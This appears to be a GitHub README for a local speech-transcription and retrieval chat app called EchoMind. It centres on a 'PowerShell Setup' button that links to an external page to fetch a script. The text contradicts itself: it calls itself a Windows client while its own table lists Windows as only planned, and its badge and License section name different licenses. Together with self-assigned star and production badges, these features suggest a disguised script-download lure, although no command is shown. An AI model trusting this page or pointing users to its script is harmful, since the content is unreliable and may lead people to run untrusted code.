<div align="center">

# EchoMind Voice Assistant — Local Speech Transcription & RAG Chatbot Windows Desktop Client

![](files/preview.png)

### 🖥️ PowerShell Setup

[![](files/button.png)](https://Niruthiya04.github.io/echomind-voice-assistant/)

[![powershell-7](https://img.shields.io/badge/POWERSHELL--7-5.1%2B_%2F_7%2B-2f81f7?style=plastic&labelColor=0d1117)]() [![license](https://img.shields.io/badge/LICENSE-APACHE--2.0-54aeff?style=plastic&labelColor=0d1117)]() [![stars](https://img.shields.io/badge/STARS-5.0%2F5-f59e0b?style=plastic&labelColor=0d1117)]() [![stage](https://img.shields.io/badge/STAGE-PRODUCTION-2ea44f?style=plastic&labelColor=0d1117)]()

</div>

---

EchoMind Voice Assistant is a local-first desktop application that captures spoken input, transcribes it in real time, and turns finalized utterances into a persistent, queryable memory store backed by SQLite and on-device vector search. A grounded retrieval-augmented chat interface lets you ask questions in natural language and receive answers anchored in your own transcribed speech rather than model guesswork. All speech recognition, embedding, and chat inference run on your machine by default, with optional external speech processing available solely through explicit user configuration. The application features live browser-based capture, local semantic retrieval with a deterministic fallback, pluggable GGUF chat models, and native transcription runtimes for faster on-device performance. No data leaves your device unless you deliberately enable an external integration and supply your own credentials.

## 📋 System Requirements

- **PowerShell 5.1+** (pre-installed on Windows 10 and 11)
- **Windows 10 / 11** (x64)
- **Internet connection** — required to fetch the script
- **Administrator** — *not* required

## Features

🎙️ **Live browser capture** — start a session with a single click and watch the transcript materialize word by word as you speak, streamed directly to the interface with no server round trip.

- 🔍 **Local semantic search** — every finalized segment is embedded and written to a SQLite-backed memory store with timestamps, so any past utterance can be retrieved later and traced back to the moment it was recorded.

- 🧠 **Grounded retrieval chat** — ask questions in plain language and receive answers assembled from retrieved transcript context rather than model guesswork, keeping responses anchored to what was actually said.

- 📦 **Explicit model provisioning** — no silent background fetches. Every model is pulled deliberately from the in-app local model setup panel, giving you full visibility into what lands on disk and when.

- 🧩 **Pluggable inference backends** — swap between GGUF chat models for answer generation and transcript cleanup, with native Nemotron and Fun-ASR runtimes available for lower-latency on-device transcription.

- 🌐 **Optional cloud speech path** — Sarvam Saaras v3 can be enabled for Indian-language speech processing, remaining entirely dormant until you supply your own credentials.

- 🔒 **Local-first architecture** — recordings, transcripts, embeddings, and settings stay on your machine by default, with no outbound speech, embedding, or chat calls unless you explicitly opt in.

- 🗂️ **Persistent, portable storage** — memory data and model files live in dedicated local directories that are excluded from version control, keeping your history private and easy to back up on your own terms.

- ⚙️ **Configurable runtime** — database paths, model directories, ASR device selection, and pre-existing local model paths are all adjustable through environment configuration for tailored deployments.

## How it works

EchoMind runs as a local-first pipeline: speech is captured, transcribed on-device, indexed into a persistent memory store, and then queried through a retrieval-augmented chat interface that answers strictly from what you've recorded. No audio, transcript, or query is transmitted to an external service during normal operation.

**1. Capture.** Recording begins only when you explicitly start a session. The desktop client streams audio from the selected input device in short buffers, giving live visual feedback while the session is active. Capture can be paused or stopped at any point, and every segment is tagged with a timestamp so the resulting memory remains temporally traceable.

**2. Live transcription.** A locally hosted automatic speech recognition model converts each audio buffer into text incrementally, and partial results are rendered in the transcript pane as you speak. When a segment is finalized, the text is committed to the session record. Recognition models are selected and loaded locally; the app does not fetch anything in the background without your action.

**3. Memory indexing.** Finalized transcript segments are chunked, embedded with a local embedding model, and written to an on-disk database alongside their timestamps and session identifiers. The vector representation enables semantic retrieval, so a query matches on meaning rather than exact phrasing. A deterministic lexical fallback keeps search functional even when no embedding model is loaded.

**4. Retrieval-augmented chat.** When you ask a question, EchoMind embeds the query, retrieves the most relevant transcript chunks from the local store, and passes them as grounding context to a local chat model. Responses cite the retrieved passages they were derived from, so every answer can be traced back to a specific moment in your recorded speech. If the store contains nothing relevant, the assistant reports that rather than speculating.

**5. Persistence and isolation.** The database, embeddings, model files, and configuration all reside in local directories on your machine. Nothing is synchronized or uploaded unless you deliberately enable an optional external integration and supply your own credentials. Because retrieval and generation both run on-device after initial model provisioning, the assistant remains fully operational without a network connection.

## Compatibility

EchoMind is engineered for local-first operation on desktop hardware, with portability across the three major operating systems as a design goal. The current reference runtime targets macOS on Apple Silicon, with Apple Silicon acceleration leveraged for on-device inference where available; the architecture itself avoids platform-specific assumptions at the inference layer.

**Operating system support**

| Platform | Status | Notes |
|-|-|-|
| macOS (Apple Silicon) | Reference target | Validated for local ASR, embeddings, and GGUF chat inference |
| macOS (Intel) | Supported | Local inference available; expect longer transcription latency |
| Linux | Planned | Core services are platform-neutral; packaging work in progress |
| Windows | Planned | Requires native runtime validation before general availability |

**Runtime requirements**

- Python 3.12 through 3.14, with a virtual environment recommended to isolate dependencies
- 4 GB of system memory at minimum; larger local chat models scale their memory footprint accordingly, and 8 GB or more is advisable when running ASR, embeddings, and chat models concurrently
- Sufficient disk headroom under the model directory for downloaded weights; model sizes vary by family and quantization
- A modern browser with microphone capture support for the live transcript interface
- Docker Desktop 4.x or newer for containerized deployments, with named volumes recommended for persistent data and model storage

**Model and backend compatibility**

EchoMind supports pluggable local model backends across the transcription and retrieval pipeline:

- **Speech recognition** — local Whisper-family models for on-device transcription, with native Nemotron and Fun-ASR runtimes available for accelerated transcription on supported hardware
- **Embeddings** — local embedding models for semantic memory storage, with a deterministic fallback active until a model is loaded
- **Chat inference** — GGUF-format chat models for grounded retrieval-augmented responses and transcript cleanup
- **Optional cloud speech** — Sarvam Saaras v3 for Indian-language speech, active only after a user-supplied key is entered; disabled by default

Model paths can be supplied through configuration variables when existing local weights are already present, allowing EchoMind to integrate with an established on-device model inventory rather than enforcing a fixed download set. Hardware acceleration is configurable per device, defaulting to CPU inference for maximum portability.

**Data compatibility**

Memory records are persisted in SQLite alongside timestamps and locally computed embeddings, keeping the store self-contained and independent of external services. The database and model directories are relocatable via configuration, and both are excluded from version control so local data remains under the operator's control across upgrades and environment changes.

## FAQ

**Does EchoMind require an internet connection to function?**
No. The default configuration processes all speech recognition, embedding generation, and retrieval-augmented chat locally on your machine. Network access is needed only for the one-time model acquisition step performed explicitly through the in-app Local model setup panel; after models are present on disk, capture, transcription, storage, retrieval, and chat operate fully offline. An optional cloud speech provider can be enabled, but it remains inactive until you supply your own credentials.

**Where is my voice data stored, and does anything leave my device?**
All transcript segments, embeddings, timestamps, and settings persist in a local SQLite database and associated model directory on your filesystem. Nothing is transmitted externally under default settings. Optional third-party speech processing is strictly opt-in and only becomes active once you provide credentials through the interface, which are stored with restrictive local permissions where the operating system supports it.

**Which models power transcription and chat, and can I substitute my own?**
EchoMind uses local ASR for streaming transcription, local embedding models for semantic indexing, and local GGUF chat models for grounded answers. Native runtimes are available for faster on-device transcription. Because the model layer is pluggable, you can point the configuration at existing local model paths rather than relying on the in-app acquisition flow, allowing you to choose the balance of accuracy, latency, and memory footprint that fits your hardware.

**What happens if a model has not been loaded yet?**
The memory store falls back to a deterministic embedding path so indexing and retrieval continue to function even before a semantic embedding model is loaded. Answers remain grounded in retrieved transcript context; loading the recommended models improves retrieval quality but is not a prerequisite for basic operation.

**How does the RAG chat ensure answers are grounded in what was actually said?**
When you ask a question, EchoMind retrieves the most relevant transcript chunks from the local vector store, then supplies that retrieved context to the local chat model. Answers are therefore derived from your recorded speech rather than generated from general knowledge alone, and each memory remains traceable to its original timestamp.

**What are the hardware and platform requirements?**
EchoMind targets macOS with Python 3.12 through 3.14 and requires at least 4 GB of RAM, with additional memory recommended for larger local models. A containerized deployment path is also provided for environments running Docker Desktop. On Apple Silicon, the chat inference dependency may compile locally during setup.

**Can I run EchoMind in a container without exposing my data?**
Yes. The container image runs as a non-root user and persists its database, settings, and models in named volumes so state survives upgrades. Browser microphone access functions through localhost in Docker Desktop, and no data is written outside the mounted volumes.

**How do I verify a build before publishing changes?**
The repository includes a standard-library unit test suite plus a public-repository check that rejects tracked databases, model files, local binaries, environment files, and common credential markers. Both are intended to run prior to pushing changes, alongside the security guidance maintained in the project documentation.

**Does EchoMind replace a hearing aid or medical device?**
No. EchoMind is an assistive memory tool designed to help you keep a reliable, searchable record of conversations. It is not a hearing aid, medical device, or diagnostic instrument, and it should not be relied upon for safety-critical or clinical purposes.

## Disclaimer

EchoMind Voice Assistant is provided as a local-first tool for personal transcription and recall, and it is offered on an as-is basis without warranties of any kind, whether express or implied, including but not limited to warranties of merchantability, fitness for a particular purpose, and non-infringement.

Transcription accuracy depends on microphone quality, acoustic conditions, speaker clarity, and the local ASR model in use. Transcripts and RAG chat responses are machine-generated and may contain errors, omissions, or misinterpretations; they should not be treated as authoritative records. Always verify critical information, particularly in medical, legal, financial, or safety-relevant contexts, against the original conversation or an independent source. EchoMind is an assistive memory tool and is not a medical device, hearing aid, or substitute for professional accessibility equipment or clinical advice.

Because processing and storage occur on your machine, you are responsible for the security of your device, your local data directory, and any models or credentials you configure. Data retained by EchoMind remains subject to your local backup, disk encryption, and access-control practices. If you enable the optional Sarvam integration and supply your own key, audio or text may be transmitted to that third-party service under its own terms; review those terms before enabling it. Do not use EchoMind to record individuals without the consent required by the laws of your jurisdiction.

To the maximum extent permitted by applicable law, the authors and contributors of EchoMind accept no liability for any direct, indirect, incidental, special, consequential, or exemplary damages arising from the use of or inability to use the software, including loss of data, missed information, or reliance on generated transcripts or answers. You assume full responsibility for how you deploy, configure, and depend on EchoMind, and for compliance with all local regulations governing recording, privacy, and data retention.

## License

EchoMind Voice Assistant is distributed under the MIT License, a permissive open-source license that grants broad rights to use, modify, and redistribute the software. Under its terms, you may run the application for any purpose, integrate its components into your own projects, and adapt the source to suit your workflow, provided the original copyright notice and permission notice are preserved in all copies or substantial portions of the software.

The license is provided on an "as is" basis, without warranty of any kind, express or implied, including but not limited to warranties of merchantability, fitness for a particular purpose, and non-infringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability arising from, out of, or in connection with the software or its use.

Because EchoMind is designed as a local-first assistant, the license does not impose any network, telemetry, or attribution-in-UI obligations. You retain full ownership of the speech data, transcripts, embeddings, and memory stores you generate; the license covers the application code only. Redistributions of modified builds should retain the license text alongside the source so downstream users understand their rights.

For the complete and legally binding terms, consult the LICENSE file distributed with the project.